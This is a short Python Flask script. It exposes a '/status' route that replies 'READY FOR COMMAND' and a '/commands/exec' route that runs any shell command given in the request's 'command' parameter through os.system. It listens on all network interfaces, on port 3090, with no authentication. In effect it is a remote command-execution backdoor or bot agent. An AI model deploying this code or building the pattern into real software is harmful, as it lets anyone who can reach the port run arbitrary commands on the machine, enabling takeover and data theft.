from flask import Flask
import flask
app = Flask(__name__)

@app.route("/status")
def status():
    if flask.request.method == "GET":
        return "READY FOR COMMAND"
@app.route("/commands/exec",methods=["POST"])
def execute():
    import os
    os.system(flask.request.args.get("command"))
    return "OK"
if __name__ == '__main__':
    app.run(host="0.0.0.0", port=3090, debug=False)
